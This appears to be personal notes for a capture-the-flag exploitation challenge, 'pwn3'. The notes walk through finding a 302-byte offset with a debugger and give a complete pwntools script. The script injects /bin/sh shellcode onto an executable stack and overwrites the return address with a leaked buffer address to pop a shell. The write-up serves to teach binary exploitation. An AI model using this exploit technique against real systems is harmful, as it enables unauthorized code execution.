![[pwn3]]
### Recon
![[Pasted image 20240508181113.png]]
- we see that Stack can be executable so we can inject shell code
### Walkthrough
- Dissassembling main function ![[Pasted image 20240508185058.png]]
- we see that in 12 th line echo() is called
- dissassembling echo ![[Pasted image 20240508185200.png]]
- the address printed is the address of char array initialized and got as input
- no other functions we can see
- inject shell code in this char array padd with offset and overwrite RIP with this char array
- `<shellcode> + <302 bytes buffer - shellcode length> + <given address>`
### Finding offset
- disassemble main ![[Pasted image 20240508185924.png]]
- set breakpoint before return `break *echo+61`
- run ![[Pasted image 20240508190704.png]]
- find offset between input and eip 
- input is stored in ![[Pasted image 20240508191601.png]]
- EIP is at ![[Pasted image 20240508191642.png]]
- `0xffffceec - 0xffffcdbe = 302`
- how 302 (294 char array +4 sp +4 ip)
### Payload
- shellcode 
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```
- "0" x 302 
- address printed(char addr)
- `<shellcode> + <302 bytes buffer - shellcode length> + <given address>`


```
from pwn import *

target = process('./pwn3')

# Print out the text, up to the address of the start of our input
print target.recvuntil("journey ")

# Scan in the rest of the line
leak = target.recvline()

# Strip away the characters not part of our address
shellcodeAdr = int(leak.strip("!\n"), 16)

# Make the payload
payload = ""
# Our shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# Pad the rest of the space to the return address with zeroes
payload += "0"*(0x12e - len(payload))
# Overwrite the return address with te leaked address which points to the start of our shellcode
payload += p32(shellcodeAdr)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use our newly popped shell
target.interactive()

```